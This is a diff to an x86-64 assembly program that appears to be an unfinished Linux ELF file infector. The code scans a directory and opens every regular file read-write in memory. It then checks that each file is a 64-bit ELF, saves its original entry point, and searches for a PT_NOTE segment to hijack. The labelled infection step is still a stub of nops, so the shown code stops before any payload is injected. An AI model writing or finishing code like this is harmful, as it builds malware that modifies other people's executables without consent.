@@ -8,10 +8,11 @@ SYS_OPEN       equ 2
 SYS_CLOSE      equ 3
 SYS_FSTAT      equ 5
 SYS_MMAP       equ 9
+SYS_MUNMAP     equ 11
 
-DIRENT_OFF_DRECLEN equ 8 + 8         ; dirent.d_reclen
-DIRENT_OFF_DTYPE   equ 8 + 8 + 2     ; dirent.d_type
-DIRENT_OFF_DNAME   equ 8 + 8 + 2 + 1 ; dirent.d_name
+OFF_DIRENT_DRECLEN equ 16 ; dirent.d_reclen
+OFF_DIRENT_DTYPE   equ 18 ; dirent.d_type
+OFF_DIRENT_DNAME   equ 19 ; dirent.d_name
 
 STAT_OFF_STSIZE equ 48          ; stat.st_size
 
@@ -28,7 +29,14 @@ PROT_READ  equ 1
 PROT_WRITE equ 2
 MAP_SHARED equ 1
 
+PT_NOTE    equ 4
 ELFCLASS64 equ 2
+
+OFF_EHDR_IDENT_CLASS equ 4      ; elf.ehdr.e_ident[4]
+OFF_EHDR_ENTRY       equ 24     ; elf.ehdr.e_entry
+OFF_EHDR_PHOFF       equ 32     ; elf.ehdr.e_phoff
+OFF_EHDR_PHENTSIZE   equ 54     ; elf.ehdr.e_phentsize
+OFF_EHDR_PHNUM       equ 56     ; elf.ehdr.e_phnum
 
 SECTION .data
 
@@ -79,7 +87,7 @@ file_loop:
     ; loop over each dirent structure
     push rcx
 
-    cmp byte [r15 + rcx + DIRENT_OFF_DTYPE], DT_REG
+    cmp byte [r15 + rcx + OFF_DIRENT_DTYPE], DT_REG
     jne file_loop_continue      ; if the file is not a regular file,
                                 ; skip it
 
@@ -88,7 +96,7 @@ open_file:
     ; order to get its size. The size is needed to mmap() the file
     ; into memory.
     mov rax, SYS_OPEN
-    lea rdi, byte [r15 + rcx + DIRENT_OFF_DNAME]
+    lea rdi, byte [r15 + rcx + OFF_DIRENT_DNAME]
     mov rsi, O_RDWR
     xor rdx, rdx
     syscall
@@ -123,18 +131,52 @@ open_file:
 
 open_file_end:
     mov qword [r15 + ST_OPEN_FILE_ADDR], rax
+    mov r14, rax
 
 is_elf:
-    cmp dword [r15 + ST_OPEN_FILE_ADDR], 0x464c457f
-    jne close_file
+    cmp dword [r14], 0x464c457f
+    jne unmap_file
 
 is_x64:
-    cmp byte [r15 + ST_OPEN_FILE_ADDR + 4], ELFCLASS64
-    jne close_file
+    cmp byte [r14 + OFF_EHDR_IDENT_CLASS], ELFCLASS64
+    jne unmap_file
 
-    ; TODO(phos): do stuff
-    ; TODO(phos): munmap() mapped file
+process_file:
+    mov r13, qword [r14 + OFF_EHDR_ENTRY] ; store original entry point
+                                          ; for later use
+
+    xor rcx, rcx
+search_ptnote:
+    ; compute the offset from the first phdr to the current phdr
+    xor rax, rax
+    mov ax,  word [r14 + OFF_EHDR_PHENTSIZE]
+    mul rcx
+
+    ; add the offset to get to the first phdr
+    add rax, [r14 + OFF_EHDR_PHOFF]
+
+    cmp byte [r14 + rax], PT_NOTE
+    je  infect_ptnote
+
+    inc  rcx
+    cmp  cx, word [r14 + OFF_EHDR_PHNUM] ; check if rcx == ehdr.phnum
+    je   unmap_file                      ; if so, no ptnote section in the binary
+    jmp  search_ptnote
     
+infect_ptnote:
+    ; TODO(phos): works up to this point
+    nop
+    nop
+    nop
+
+unmap_file:
+    mov rax, SYS_MUNMAP
+    mov rdi, qword [r15 + ST_OPEN_FILE_ADDR]
+    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
+    syscall
+
+    ; TODO(phos): need to handle this error or just let it fallthrough?
+   
 close_file:
     mov rax, SYS_CLOSE          ; once the file is mmap()'ed, it can
                                 ; be closed without any side effects.
@@ -143,7 +185,7 @@ close_file:
 
 file_loop_continue:
     pop rcx
-    add cx,  word [r15 + rcx + DIRENT_OFF_DRECLEN]
+    add cx,  word [r15 + rcx + OFF_DIRENT_DRECLEN]
     cmp rcx, [r15 + ST_DIRENT_SIZE_OFF]
     jne file_loop
 
